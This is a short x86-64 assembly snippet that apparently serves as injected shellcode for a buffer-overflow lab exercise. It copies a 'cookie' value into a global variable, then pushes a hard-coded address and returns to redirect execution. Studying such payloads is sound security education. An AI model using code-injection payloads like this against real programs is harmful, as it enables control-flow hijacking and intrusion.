movq $0x602320, %rax # move cookie address to rax
movq $0x602308, %rdi # move global_value address to rdi
movq (%rax), %rcx
movq %rcx, (%rdi)
pushq $0x00401020
ret
